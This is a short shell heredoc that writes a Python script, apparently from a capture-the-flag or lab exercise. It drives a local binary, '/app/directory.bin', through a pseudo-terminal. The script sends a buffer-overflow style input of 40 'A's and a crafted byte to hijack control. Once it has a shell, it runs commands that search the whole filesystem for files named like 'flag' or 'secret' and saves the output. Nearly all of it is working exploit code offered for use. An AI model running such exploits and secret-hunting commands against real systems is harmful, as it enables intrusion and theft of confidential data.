cat << 'EOF' > /tmp/pty_simple.py
import pty, os, time
pid, fd = pty.fork()
if pid == 0:
    os.execv('/app/directory.bin', ['/app/directory.bin'])
else:
    time.sleep(0.5)
    for i in range(9):
        os.write(fd, b"1\n")
        time.sleep(0.05)
        os.write(fd, b"A\n")
        time.sleep(0.05)
    os.write(fd, b"1\n")
    time.sleep(0.05)
    os.write(fd, b"A"*40 + b"\x37")
    time.sleep(0.05)
    os.write(fd, b"4\n")
    time.sleep(0.5)
    os.write(fd, b"echo EXPLOIT_SUCCESS; find / -iname '*flag*' -o -iname '*secret*' 2>/dev/null; ls -la /tmp; exit\n")
    time.sleep(1)
    out = b''
    while True:
        try:
            chunk = os.read(fd, 4096)
            if not chunk: break
            out += chunk
        except: break
    open('/tmp/exploit_out', 'wb').write(out)
EOF
